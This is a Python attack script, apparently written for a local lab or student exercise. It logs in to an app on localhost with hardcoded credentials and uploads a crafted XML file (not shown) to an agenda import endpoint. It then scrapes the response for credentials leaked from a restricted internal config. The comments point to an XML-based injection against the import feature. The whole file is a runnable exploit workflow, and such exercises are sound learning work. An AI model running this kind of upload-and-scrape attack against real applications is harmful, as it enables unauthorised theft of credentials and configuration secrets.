#uploading the xml file, then showing that its leaking the credentials, which shouldnt be there in the first place
#<!-- NOTE: /internal/config restricted to localhost only. do not expose. --># displayed in the sourcefiles of landing page.
import sys
import requests
from bs4 import BeautifulSoup


GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

# step 1 - login and get session cookie
identity = "jdoe@student.42.tech"
password = "abc123"
auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": identity, "password": password},
    allow_redirects=False
)
 
cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print(f"{GREEN}Logged in successfully with " + identity + " and " + password )

print(f"{RESET}__________")
input(f"{GREEN}press anything to upload xmlscript.xml to : http://localhost:4942/agenda/import")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
print("uploading.")
# step 2 - upload file

filepath = "xmlscript.xml"
filename = filepath
targeturl = "http://localhost:4942/agenda/import"
 
with open(filepath, "rb") as f:
    response = requests.post(
        targeturl,
        files={"file": (filename, f, "text/xml")},
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942/agenda",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
        allow_redirects=False
    )

print("Upload status:", response.status_code)

# step 3 - pass the response to Beautifulsoup (parsing websites library, and extracting the now leaked details)

print(f"{RESET}__________")
input(f"{GREEN}press anything to access the information displayed by the website")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
print("displaying.")

soup = BeautifulSoup(response.text, "html.parser")

cell = soup.find("td", class_="td-primary")
if cell:
    print(cell.get_text(strip=True))
else:
    print("ohno")
 
